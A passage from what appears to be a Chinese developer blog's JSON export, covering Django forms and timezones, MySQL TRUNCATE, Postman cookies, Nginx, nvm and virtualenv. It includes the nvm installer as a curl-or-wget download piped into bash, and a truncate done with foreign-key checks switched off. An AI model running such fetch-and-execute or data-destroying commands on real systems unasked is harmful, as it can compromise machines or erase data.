form.cleaned_data[&apos;message&apos;] sender = form.cleaned_data[&apos;sender&apos;] cc_myself = form.cleaned_data[&apos;cc_myself&apos;] recipients = [&apos;info@example.com&apos;] if cc_myself: recipients.append(sender) send_mail(subject, message, sender, recipients) return HttpResponseRedirect(&apos;/thanks/&apos;) Bound and unbound formsA Form instance is either bound to a set of data, or unbound. If it’s bound to a set of data, it’s capable of validating that data and rendering the form as HTML with the data displayed in the HTML. If it’s unbound, it cannot do validation (because there’s no data to validate!), but it can still render the blank form as HTML. To create an unbound Form instance, simply instantiate the class: 1&gt;&gt;&gt; f = ContactForm() To bind data to a form, pass the data as a dictionary as the first parameter to your Form class constructor: 12345&gt;&gt;&gt; data = &#123;&apos;subject&apos;: &apos;hello&apos;,... &apos;message&apos;: &apos;Hi there&apos;,... &apos;sender&apos;: &apos;foo@example.com&apos;,... &apos;cc_myself&apos;: True&#125;&gt;&gt;&gt; f = ContactForm(data) In this dictionary, the keys are the field names, which correspond to the attributes in your Form class. The values are the data you’re trying to validate. These will usually be strings, but there’s no requirement that they be strings; the type of data you pass depends on the Field, as we’ll see in a moment. Forms FieldsBuilt-in Field classes BooleanField CharField ChoiceField DateField DateTimeField DecimalField IntegerField See https://docs.djangoproject.com/en/2.2/ref/forms/fields/ for more details. Core field argumentsrequiredBy default, each Field class assumes the value is required, so if you pass an empty value – either None or the empty string (&quot;&quot;) – then clean() will raise a ValidationError exception: 1234567891011121314151617181920&gt;&gt;&gt; from django import forms&gt;&gt;&gt; f = forms.CharField()&gt;&gt;&gt; f.clean(&apos;foo&apos;)&apos;foo&apos;&gt;&gt;&gt; f.clean(&apos;&apos;)Traceback (most recent call last):...ValidationError: [&apos;This field is required.&apos;]&gt;&gt;&gt; f.clean(None)Traceback (most recent call last):...ValidationError: [&apos;This field is required.&apos;]&gt;&gt;&gt; f.clean(&apos; &apos;)&apos; &apos;&gt;&gt;&gt; f.clean(0)&apos;0&apos;&gt;&gt;&gt; f.clean(True)&apos;True&apos;&gt;&gt;&gt; f.clean(False)&apos;False&apos; To specify that a field is not required, pass required=False to the Field constructor: 12345678910111213&gt;&gt;&gt; f = forms.CharField(required=False)&gt;&gt;&gt; f.clean(&apos;foo&apos;)&apos;foo&apos;&gt;&gt;&gt; f.clean(&apos;&apos;)&apos;&apos;&gt;&gt;&gt; f.clean(None)&apos;&apos;&gt;&gt;&gt; f.clean(0)&apos;0&apos;&gt;&gt;&gt; f.clean(True)&apos;True&apos;&gt;&gt;&gt; f.clean(False)&apos;False&apos; If a Field has required=False and you pass clean() an empty value, then clean() will return a normalized empty value rather than raising ValidationError. For CharField, this will be an empty string. For other Field classes, it might be None. (This varies from field to field.) Widgets of required form fields have the required HTML attribute. Set the Form.use_required_attribute attribute to False to disable it. The required attribute isn’t included on forms of formsets because the browser validation may not be correct when adding and deleting formsets. labelThe label argument lets you specify the “human-friendly” label for this field. This is used when the Field is displayed in a Form. As explained in “Outputting forms as HTML” above, the default label for a Field is generated from the field name by converting all underscores to spaces and upper-casing the first letter. Specify label if that default behavior doesn’t result in an adequate label. Here’s a full example Form that implements label for two of its fields. We’ve specified auto_id=False to simplify the output: 12345678910&gt;&gt;&gt; from django import forms&gt;&gt;&gt; class CommentForm(forms.Form):... name = forms.CharField(label=&apos;Your name&apos;)... url = forms.URLField(label=&apos;Your website&apos;, required=False)... comment = forms.CharField()&gt;&gt;&gt; f = CommentForm(auto_id=False)&gt;&gt;&gt; print(f)&lt;tr&gt;&lt;th&gt;Your name:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; required&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Your website:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Comment:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;comment&quot; required&gt;&lt;/td&gt;&lt;/tr&gt; disabledThe disabled boolean argument, when set to True, disables a form field using the disabled HTML attribute so that it won’t be editable by users. Even if a user tampers with the field’s value submitted to the server, it will be ignored in favor of the value from the form’s initial data. Initial ValuesUse initial to declare the initial value of form fields at runtime. For example, you might want to fill in a username field with the username of the current session. To accomplish this, use the initial argument to a Form. This argument, if given, should be a dictionary mapping field names to initial values. Only include the fields for which you’re specifying an initial value; it’s not necessary to include every field in your form. For example: 1&gt;&gt;&gt; f = ContactForm(initial=&#123;&apos;subject&apos;: &apos;Hi there!&apos;&#125;) These values are only displayed for unbound forms, and they’re not used as fallback values if a particular value isn’t provided. If a Field defines initial and you include initial when instantiating the Form, then the latter initial will have precedence. In this example, initial is provided both at the field level and at the form instance level, and the latter gets precedence: 12345678910&gt;&gt;&gt; from django import forms&gt;&gt;&gt; class CommentForm(forms.Form):... name = forms.CharField(initial=&apos;class&apos;)... url = forms.URLField()... comment = forms.CharField()&gt;&gt;&gt; f = CommentForm(initial=&#123;&apos;name&apos;: &apos;instance&apos;&#125;, auto_id=False)&gt;&gt;&gt; print(f)&lt;tr&gt;&lt;th&gt;Name:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;instance&quot; required&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Url:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;url&quot; name=&quot;url&quot; required&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Comment:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;comment&quot; required&gt;&lt;/td&gt;&lt;/tr&gt; ValidationA Form instance has an is_valid() method, which runs validation routines for all its fields. When this method is called, if all fields contain valid data, it will: return True place the form’s data in its cleaned_data attribute. Accessing “clean” dataEach field in a Form class is responsible not only for validating data, but also for “cleaning” it – normalizing it to a consistent format. This is a nice feature, because it allows data for a particular field to be input in a variety of ways, always resulting in consistent output. For example, DateField normalizes input into a Python datetime.date object. Regardless of whether you pass it a string in the format &#39;1994-07-15&#39;, a datetime.date object, or a number of other formats, DateField will always normalize it to a datetime.date object as long as it’s valid. Once you’ve created a Form instance with a set of data and validated it, you can access the clean data via its cleaned_data attribute: 123456789&gt;&gt;&gt; data = &#123;&apos;subject&apos;: &apos;hello&apos;,... &apos;message&apos;: &apos;Hi there&apos;,... &apos;sender&apos;: &apos;foo@example.com&apos;,... &apos;cc_myself&apos;: True&#125;&gt;&gt;&gt; f = ContactForm(data)&gt;&gt;&gt; f.is_valid()True&gt;&gt;&gt; f.cleaned_data&#123;&apos;cc_myself&apos;: True, &apos;message&apos;: &apos;Hi there&apos;, &apos;sender&apos;: &apos;foo@example.com&apos;, &apos;subject&apos;: &apos;hello&apos;&#125; Note that any text-based field – such as CharField or EmailField – always cleans the input into a string. We’ll cover the encoding implications later in this document. If your data does not validate, the cleaned_data dictionary contains only the valid fields: 123456789&gt;&gt;&gt; data = &#123;&apos;subject&apos;: &apos;&apos;,... &apos;message&apos;: &apos;Hi there&apos;,... &apos;sender&apos;: &apos;invalid email address&apos;,... &apos;cc_myself&apos;: True&#125;&gt;&gt;&gt; f = ContactForm(data)&gt;&gt;&gt; f.is_valid()False&gt;&gt;&gt; f.cleaned_data&#123;&apos;cc_myself&apos;: True, &apos;message&apos;: &apos;Hi there&apos;&#125; cleaned_data will always only contain a key for fields defined in the Form, even if you pass extra data when you define the Form. In this example, we pass a bunch of extra fields to the ContactForm constructor, but cleaned_data contains only the form’s fields: 123456789101112&gt;&gt;&gt; data = &#123;&apos;subject&apos;: &apos;hello&apos;,... &apos;message&apos;: &apos;Hi there&apos;,... &apos;sender&apos;: &apos;foo@example.com&apos;,... &apos;cc_myself&apos;: True,... &apos;extra_field_1&apos;: &apos;foo&apos;,... &apos;extra_field_2&apos;: &apos;bar&apos;,... &apos;extra_field_3&apos;: &apos;baz&apos;&#125;&gt;&gt;&gt; f = ContactForm(data)&gt;&gt;&gt; f.is_valid()True&gt;&gt;&gt; f.cleaned_data # Doesn&apos;t contain extra_field_1, etc.&#123;&apos;cc_myself&apos;: True, &apos;message&apos;: &apos;Hi there&apos;, &apos;sender&apos;: &apos;foo@example.com&apos;, &apos;subject&apos;: &apos;hello&apos;&#125; When the Form is valid, cleaned_data will include a key and value for all its fields, even if the data didn’t include a value for some optional fields. In this example, the data dictionary doesn’t include a value for the nick_name field, but cleaned_data includes it, with an empty value: 1234567891011&gt;&gt;&gt; from django import forms&gt;&gt;&gt; class OptionalPersonForm(forms.Form):... first_name = forms.CharField()... last_name = forms.CharField()... nick_name = forms.CharField(required=False)&gt;&gt;&gt; data = &#123;&apos;first_name&apos;: &apos;John&apos;, &apos;last_name&apos;: &apos;Lennon&apos;&#125;&gt;&gt;&gt; f = OptionalPersonForm(data)&gt;&gt;&gt; f.is_valid()True&gt;&gt;&gt; f.cleaned_data&#123;&apos;nick_name&apos;: &apos;&apos;, &apos;first_name&apos;: &apos;John&apos;, &apos;last_name&apos;: &apos;Lennon&apos;&#125; In this above example, the cleaned_data value for nick_name is set to an empty string, because nick_name is CharField, and CharFields treat empty values as an empty string. Each field type knows what its “blank” value is – e.g., for DateField, it’s None instead of the empty string. For full details on each field’s behavior in this case, see the “Empty value” note for each field in the “Built-in Field classes” section below. 空值问题当我们指定这个 field 为required=False时， 如果该类型是一个类类型，当没有传该 key 时，通过 form.cleaned_data[”start_data“] 获取值，就是 None； 如果是 string，通过 form.cleaned_data[”start_data“] 获取值，则为””； 举例123# forms.pyclass MultipleUserForm(forms.Form): ids = forms.CharField(required=False) 123views.pyif form.is_valid(): ids_str = form.cleaned_data['ids'] 如果请求的 querystring中没有 ids 这个 key，则ids_str 为“”，即 123456&gt;&gt;&gt; ids_str == \"\"True&gt;&gt;&gt; bool(ids_str == \"\")True&gt;&gt;&gt; ids_str is NoneFalse 总结当我们指定这个 field 为required=False时，可以通过以下结构来获取这个 field 的值: 1234if form.is_valid(): xxx = form.cleaned_data[&apos;xxx&apos;] if xxx: ... Reference The Forms API - https://docs.djangoproject.com/en/2.2/ref/forms/api/ Form fields - https://docs.djangoproject.com/en/2.2/ref/forms/fields/ https://docs.djangoproject.com/en/2.2/topics/forms/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【SQL】清空表数据后如何让自增 ID 从 1 开始","date":"2019-10-20T05:34:23.000Z","path":"2019/10/20/【SQL】清空表数据后如何让自增-ID-从-1-开始/","text":"ProblemMySQL清空表中数据后，如何让自增ID从1开始？ Solution清空表中数据时，使用truncate命令，而不用delete命令。 1mysql&gt; truncate test; 使用truncate命令的好处： 速度快：因为 trancate 命令是 DDL 语句，而 delete 语句是 DML 语句，因此 trancate 命令的执行非常快（当然 drawback 就是不能回滚，而 delete 语句可以）。 自增id会从 1 开始进算 关于 delete、drop、trancate 三种删除操作语句的区别，可访问【SQL】常用SQL语句。 Reference mysql清空表数据后如何让自增ID仍从1开始 - https://blog.csdn.net/bug_love/article/details/72626653","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"},{"name":"MySQL","slug":"SQL/MySQL","permalink":"http://swsmile.info/categories/SQL/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"},{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【MySQL】ERROR 1701 (42000): Cannot truncate a table referenced in a foreign key","date":"2019-10-20T05:18:33.000Z","path":"2019/10/20/【MySQL】ERROR-1701-42000-Cannot-truncate-a-table-referenced-in-a-foreign-key/","text":"Problemmysql删除主键重复ERROR 1701 (42000): Cannot truncate a table referenced in a foreign key Analysis若一个table 中的某个column是其他table的foreign key，那么，就不能使用对该table 使用truncate 或者drop SQL命令。 Solution执行以下语句可以执行成功 123SET FOREIGN_KEY_CHECKS=0;TRUNCATE TABLE tableName;SET FOREIGN_KEY_CHECKS=1; Reference https://blog.csdn.net/ly10228/article/details/79576934","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Django】Django 中的时间获取与相关问题","date":"2019-10-19T09:29:04.000Z","path":"2019/10/19/【Django】Django-中的时间获取与相关问题/","text":"Background在 Django1.4以后，存在两个概念：Naive time 与 Active time： Naive time就是不包含时区信息的时间， Active time就是包含时区信息（time-zone-aware）的时间 举例来说，使用datetime.datetime.utcnow()或者datetime.datetime.now()输出的类似2015-05-11 09:10:33.080451，就是不带时区信息的时间（Naive time）。而使用django.util.timezone.now()输出的类似2015-05-11 09:05:19.936835+00:00的时间就是带时区信息的时间（Active time），其中+00:00表示的就是时区相对性。 时区问题首先需要注意的是，在 Django Project 中，我们定义了时区： 123# settings.pyTIME_ZONE = 'UTC'USE_TZ = True 因此，个人推荐使用django.utils下的timezone模块来获取 Django 中涉及的任何时间，和处理 Django 中任何关于时间的问题。 另外，USE_TZ一定要设置为 True，否则会出现各种因为时区导致时间不一致的问题。 TIME_ZONE参数意义当 TIME_ZONE = ‘UTC’12345678910111213141516171819&gt;&gt;&gt; from django.utils import timezone# 获取 UTC 时间&gt;&gt;&gt; timezone.now()datetime.datetime(2019, 10, 19, 10, 9, 56, 505152, tzinfo=&lt;UTC&gt;)# 获取当前在 Django 中设置的时区对应的本地时间&gt;&gt;&gt; timezone.localtime()datetime.datetime(2019, 10, 19, 10, 10, 11, 912144, tzinfo=&lt;UTC&gt;)&gt;&gt;&gt; import datetime&gt;&gt;&gt; datetime.datetime.today() # 不包含时区信息的当前时间（Naive time）datetime.datetime(2019, 10, 19, 10, 23, 38, 117425)&gt;&gt;&gt; datetime.datetime.now() # 不包含时区信息的当前时间（当不传入 tz 参数时，和datetime.today()没有区别）datetime.datetime(2019, 10, 19, 10, 23, 38, 117425)&gt;&gt;&gt; datetime.datetime.utcnow() # 不包含时区信息的当前 UTC 时间datetime.datetime(2019, 10, 20, 5, 7, 23, 190797) 当 TIME_ZONE = ‘America/Chicago’1234567891011121314151617&gt;&gt;&gt; from django.utils import timezone&gt;&gt;&gt; import datetime# 获取 UTC 时间&gt;&gt;&gt; timezone.now() datetime.datetime(2019, 10, 19, 9, 40, 49, 253695, tzinfo=&lt;UTC&gt;) # 获取当前在 Django 中设置的时区对应的本地时间&gt;&gt;&gt; timezone.localtime() datetime.datetime(2019, 10, 19, 4, 41, 18, 503013, tzinfo=&lt;DstTzInfo 'America/Chicago' CDT-1 day, 19:00:00 DST&gt;)&gt;&gt;&gt; import datetime&gt;&gt;&gt; datetime.datetime.today() # 不包含时区信息的当前时间（Naive time）datetime.datetime(2019, 10, 19, 10, 23, 38, 117425)&gt;&gt;&gt; datetime.datetime.now() # 不包含时区信息的当前时间（当不传入 tz 参数时，和datetime.today()没有区别）datetime.datetime(2019, 10, 19, 10, 23, 38, 117425) USE_TZ参数意义Time zone support is disabled by default. To enable it, set USE_TZ = True in your settings file. Time zone support uses pytz, which is installed when you install Django. 再次强调，我们尽量将USE_TZ 设置为 True，这样 Django 就可以尽可能帮我们处理一些因为访问用户的所在时区不一致进而导致的时间不一致问题。 获取当前时区的时间12&gt;&gt;&gt; from django.utils import timezone&gt;&gt;&gt; timezone.now() Util12345# 将 datatime对象转换为特定格式的 string&gt;&gt;&gt; timezone.localtime().strftime(\"%Y-%m-%d %H:%M:%S\")'2019-10-19 04:43:28'&gt;&gt;&gt; type(timezone.localtime())&lt;type 'datetime.datetime'&gt; 可能出的问题上面的本地时间（datetime.datetime.today()），从底层 API实现来说，它会获取本地机器的时间。 而 UTC 时间（datetime.datetime.utcnow()），从底层 API实现来说，其实是在获取本地机器的时间后，根据当前机器设置的时区信息，计算出 UTC 时间。 这意味着，如果你直接修改了本地机器的时间，则通过 Python API 获取到的时间就会是错误的。 总结 在 Django Project 中，设置： 123# settings.pyTIME_ZONE = 'UTC'USE_TZ = True 使用django.utils下的timezone模块来获取 Django 中涉及的任何时间，和处理 Django 中任何关于时间的问题。 USE_TZ一定要设置为 True。 不要使用任何不包含时区信息的 API（比如，datetime.datetime.today()， datetime.datetime.now()） 使用timezone.now()来获取时间 全局统一使用 UTC 时间来处理（包括数据库中的时间存储和调用 API 时返回的时间结果），至于前端想用什么时区的时间来展示数据，由前端来处理。 Reference Time zones - https://docs.djangoproject.com/en/2.1/topics/i18n/timezones/ django时区问题时间差8小时 - https://www.jianshu.com/p/c1dee7d3cbb9","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django Shell","date":"2019-10-19T08:53:34.000Z","path":"2019/10/19/【Django】Django-Shell/","text":"Django shell12345678$ tree.├── core│ └── models.py│ ...└── manage.py...1 directory, 2 files 打开你本地的终端(不是在Python解析器里面) 然后输入这个命令: 123456789$ python manage.py shellPython 2.7.10 (default, Feb 22 2019, 21:55:15)[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.37.14)] on darwinType \"help\", \"copyright\", \"credits\" or \"license\" for more information.(InteractiveConsole)&gt;&gt;&gt;&gt;&gt;&gt; from .core import models&gt;&gt;&gt; models.Channel.objects.all()&lt;QuerySet [&lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;]&gt; 类似的，这里也是通过 from xxx import xxx 语句引用一个模块，所以可以直接调用 models 模块的方法，即通过 [方法名]()，而方法名前不再需要声明该方法所属的模块。 Reference https://tutorial.djangogirls.org/zh/django_orm/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Software Testing】Postman 中的 Cookies 设置","date":"2019-10-19T04:52:49.000Z","path":"2019/10/19/【Software-Testing】Postman-中-Cookies-设置/","text":"Background - 认证（Authentication）通过后记下 Cookie使用postman模拟接口测试的时候，一般都是需要先认证（Authentication）才可以后续业务测试的，否则直接调用接口会报错“Please Login First”。每一个接口用例都去新增一个cookie值太麻烦了，因为都是一样的，所有就想着有没有一种方法可以在进行认证后（同时得到了 cookie），之后发出的每一个 HTTP 包都带上这个 Cookie。 方法 1 - 愚蠢的 Manual Inject完成认证（Authentication）我们需要先调用特定的 HTTP 认证接口，通常需要输入账号和密码（当前也可以是其他相对更复杂的认证机制，比如 OAuth2）。最终我们就得到了一个 token，它存在 Cookie 中： 进到 Postman中，我们来设置一下这个 Cookie： 此后，每次访问这个域（127.0.0.1）时，都会带上这个 Cookie。 方法 2 - More Automatic WayPrerequisite下载以下工具： Postman Interceptor (v0.2.26 and above): https://go.pstmn.io/interceptor-download 2.1k Postman App (v7.2.1 and above): https://www.getpostman.com/downloads/ 289 Interceptor Bridge，macOS版本：OSX 1.3k 安装 Postman Interceptor，它其实是一个 Google Chrome Extension。 安装并启动 Interceptor Bridge： 123$ /Users/wei.shi/Downloads/InterceptorBridge_MacOS_1.0.0/install_hostNative messaging host com.postman.postmanapp for 'Postman Native App &lt; &gt; Interceptor integration' has been installed.$ /Users/wei.shi/Downloads/InterceptorBridge_MacOS_1.0.0/nativeserver-MacOS 打开 Postman： 当显示”INTERCEPTOR CONNETED“时，意味着Postman 已经成功通过 Interceptor Bridge 与 Chrome extension Postman Interceptor建立连接了。 我们添加好要测试的 domain，并打开 Capture Cookies 开关。 此后，每次使用Postman发出 HTTP 请求时，Postman 都可以获取到在 Chrome 中的已经存在的 Cookies。 Show Time我们先在 Chrome 中完成认证（登录）： 类似地，对应的HTTP Response 中会包含一个 Set-Cookie 域，这就是我们想要的东西。 我们再去Postman 中发一个请求，可以看到，Postman 会自动帮我们带上这个名为 token 的 Cookie： 总结Procedures每次测试前： 启动 Interceptor Bridge： 123$ /Users/wei.shi/Downloads/InterceptorBridge_MacOS_1.0.0/install_hostNative messaging host com.postman.postmanapp for 'Postman Native App &lt; &gt; Interceptor integration' has been installed.$ /Users/wei.shi/Downloads/InterceptorBridge_MacOS_1.0.0/nativeserver-MacOS 在Chrome中，完成认证； 进到Postman 中愉快的测试。 Reference Interceptor integration for Postman Native Apps - https://community.getpostman.com/t/interceptor-integration-for-postman-native-apps/5290 postman的cookie使用（绕过登录） - https://blog.csdn.net/loner_fang/article/details/81362261","comments":true,"categories":[{"name":"SoftwareTesting","slug":"SoftwareTesting","permalink":"http://swsmile.info/categories/SoftwareTesting/"}],"tags":[{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【Nginx】MacOS 下安装 Nginx","date":"2019-10-19T04:14:36.000Z","path":"2019/10/19/【Nginx】MacOS-下安装-Nginx/","text":"安装Nginx更新homebrew 1$ brew update 查看nginx信息 1$ brew search nginx 安装nginx 1$ brew install nginx 对应的配置文件地址在/etc/nginx/nginx.conf 配置文件nginx默认使用8080端口，如果发现端口被占用了，可以杀掉使用使用改端口的进程。 当然，也可以修改配置文件（/etc/nginx/nginx.conf）中指定的端口值： 123456789http &#123; server &#123; listen 8181; server_name localhost; #charset koi8-r; ..... &#125;&#125; Nginx 操作启动以指定配置文件路径的方式启动 1$ nginx -c /etc/nginx/nginx.conf ##重启 1$ nginx -s reload ##关闭 1$ nginx -s stop 查看 nginx 是否已经启动1$ ps -ef|grep nginx Reference MAC下安装nginx - https://segmentfault.com/a/1190000016020328","comments":true,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/categories/Nginx/"},{"name":"macOS","slug":"Nginx/macOS","permalink":"http://swsmile.info/categories/Nginx/macOS/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/tags/Nginx/"},{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/tags/macOS/"}]},{"title":"【Node.js】 使用 nvm 管理本地 Node.js 版本","date":"2019-10-19T04:11:41.000Z","path":"2019/10/19/【Node-js】使用-nvm-管理本地-Node-js-版本/","text":"Background在我们的日常开发中经常会遇到这种情况：手上有好几个项目，每个项目的需求不同，进而不同项目必须依赖不同版的 NodeJS 运行环境。如果没有一个合适的工具，这个问题将非常棘手。 nvm 应运而生，nvm 是 Mac 下的 node 管理工具，有点类似管理 Ruby 的 rvm，如果需要管理 Windows 下的 node，官方推荐使用 nvmw 或 nvm-windows。不过，nvm-windows 并不是 nvm 的简单移植，他们也没有任何关系。但下面介绍的所有命令，都可以在 nvm-windows 中运行。 Install nvmTo install or update nvm, you can use the install script using cURL: 1curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.0/install.sh | bash or Wget: 1wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.0/install.sh | bash Verify installationTo verify that nvm has been installed, do: 1command -v nvm which should output nvm if the installation was successful. Please note that which nvm will not work, since nvm is a sourced shell function, not an executable binary. UsageInstall nodeTo download, compile, and install the latest release of node, do this: 1nvm install node # &quot;node&quot; is an alias for the latest version To install a specific version of node: 1nvm install 6.14.4 # or 10.10.0, 8.9.1, etc The first version installed becomes the default. New shells will start with the default version of node (e.g., nvm alias default). List all node versions123456$ nvm ls nvm v0.8.26 v0.10.26 v0.11.11-&gt; v4.3.2 Use a specific node versionIn any new shell just use the installed version: 1nvm use node Or you can just run it: 1nvm run node --version Alias for a specific node version我们还可以用 nvm 给不同的版本号设置别名： 1nvm alias awesome-version 4.2.2 我们给 4.2.2 这个版本号起了一个名字叫做 awesome-version，然后我们可以运行： 1nvm use awesome-version 下面这个命令可以取消别名： 1nvm unalias awesome-version 另外，你还可以设置 default 这个特殊别名： 1nvm alias default node 在项目中使用不同版本的 Node我们可以通过创建项目目录中的 .nvmrc 文件来指定要使用的 Node 版本。之后在项目目录中执行 nvm use 即可。.nvmrc 文件内容只需要遵守上文提到的语义化版本规则即可。另外还有个工具叫做 avn，可以自动化这个过程。 在多环境中，npm该如何使用呢？每个版本的 Node 都会自带一个不同版本的 npm，可以用 npm -v 来查看 npm 的版本。全局安装的 npm 包并不会在不同的 Node 环境中共享，因为这会引起兼容问题。它们被放在了不同版本的目录下，例如 ~/.nvm/versions/node//lib/node_modules 这样的目录。这刚好也省去我们在 Linux 中使用 sudo 的功夫了。因为这是用户的主文件夹，并不会引起权限问题。 但问题来了，我们安装过的 npm 包，都要重新再装一次？幸运的是，我们有个办法来解决我们的问题，运行下面这个命令，可以从特定版本导入到我们将要安装的新版本 Node： 1nvm install v5.0.0 --reinstall-packages-from=4.2 Reference https://github.com/nvm-sh/nvm 使用 nvm 管理不同版本的 node 与 npm - http://bubkoo.com/2017/01/08/quick-tip-multiple-versions-node-nvm/","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"},{"name":"nvm","slug":"Nodejs/nvm","permalink":"http://swsmile.info/categories/Nodejs/nvm/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"},{"name":"nvm","slug":"nvm","permalink":"http://swsmile.info/tags/nvm/"}]},{"title":"【Django】处理 PUT 和 DELETE 方法","date":"2019-10-08T14:49:16.000Z","path":"2019/10/08/【Django】处理-PUT-DELETE-方法/","text":"Context使用django的小伙伴们应该都知道我们是无法开心的处理PUT和DELETE： 123456789101112131415def func(request): if request.method == 'GET': s = request.GET.get('s', None) return XXX elif request.method == 'POST': s = request.POST.get('s', None) return XXX elif request.method == 'PUT': s = request.PUT.get('s', None) # 我们希望愉快的获取继续处理 return XXX elif request.method == 'DELETE': s = request.DELETE.get('s', None) # 我们希望愉快的获取继续处理 return XXX else: pass Solution 1 - 手工解析参数Django对于PUT/DELETE请求并没有像POST/GET那样有一个字典结构。我们需要手动处理request.body获取参数： 12345678from django.http import QueryDictif request.method == \"PUT\": # Update try: paras = QueryDict(request.body) if \"name\" in paras: name = paras['name'] #or name = paras.get(\"name\") Business_Channel.update_channel(id,**&#123;\"name\":name&#125;) Solution 2 - 实现 middlewarehttps://www.guguweb.com/2014/06/25/put-and-delete-http-requests-with-django-and-jquery/ Solution 3 - 使用框架Django REST framework Reference Django简单快速实现PUT、DELETE方法 - https://www.cnblogs.com/bfmq/p/8393620.html Parsing Unsupported Requests (PUT, DELETE, etc.) in Django - https://thihara.github.io/Django-Req-Parsing/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Python】杂 - virtualenv 管理 Python 项目依赖","date":"2019-10-08T13:49:53.000Z","path":"2019/10/08/【Python】杂-virtualenv-管理-Python-项目依赖/","text":"Backgroundvirtualenv is a tool to create isolated Python environments. The basic problem being addressed is one of dependencies and versions, and indirectly permissions. Imagine you have an application that needs version 1 of LibFoo, but another application requires version 2. How can you use both these applications? If you install everything into /usr/lib/python2.7/site-packages (or whatever your platform’s standard location is), it’s easy to end up in a situation where you unintentionally upgrade an application that shouldn’t be upgraded. Or more generally, what if you want to install an application and leave it be? If an application works, any change in its libraries or the versions of those libraries can break the application. Also, what if you can’t install packages into the global site-packages directory? For instance, on a shared host. In all these cases, virtualenv can help you. It creates an environment that has its own installation directories, that doesn’t share libraries with other virtualenv environments (and optionally doesn’t access the globally installed libraries either). 总结来说，virtualenv 是用来隔离不同 Python 项目的开发与运行环境。一个典型的场景是，有一个基于 Python 2.7 的 Django 项目，基于的 Django 版本是 1.1，而同时我们本机上正在开发一个同样基于 Python 2.7 的 Django 项目，不同的是这个项目基于Django 1.2 版本。 我们通过 pip install django来安装 Django，而这个 Django 依赖包默认会保存在/usr/lib/python2.7/site-packages，且这两个项目均会通过访问 /usr/lib/python2.7/site-packages来完成我们的 Django 项目的编译。 这意味着，我们要么安装 1.1 的 Django 版本，要么安装 1.2的版本。 通过使用 virtualenv 后，它会在我们的工程文件夹下创建一个 venv 文件夹，里面包含了这个项目使用的 Python 可执行程序（或者称为 compiler 或者 interpreter）、所有依赖的第三方包。 最终，就解决了不同项目可能需要依赖不同版本的第三方包的问题。 使用1 安装1234# Python2 下$ pip2 install virtualenv# Python3 下$ pip3 install virtualenv 2 创建Python运行环境然后，假定我们要开发一个新的项目，需要一套独立的Python运行环境，可以这么做： 第一步，创建目录： 12$ mkdir myproject$ cd myproject/ 第二步，创建一个独立的Python运行环境，命名为venv： 12345$ virtualenv --no-site-packages venvUsing base prefix &apos;/usr/local/.../Python.framework/Versions/3.4&apos;New python executable in venv/bin/python3.4Also creating executable in venv/bin/pythonInstalling setuptools, pip, wheel...done. 命令virtualenv就可以创建一个独立的Python运行环境，我们还加上了参数--no-site-packages，这样，已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境。 或者，我们也指定这个项目中的 Python 版本： 1$ virtualenv venv -p python2.7 3 激活隔离环境新建的Python环境被放到当前目录下的venv目录。有了venv这个Python环境，可以用source进入该环境： 12$ source venv/bin/activate(venv)$ 注意到命令提示符变了，有个(venv)前缀，表示当前环境是一个名为venv的Python环境。 查看当前已经安装的包： 123456(venv) $ pip3 listPackage 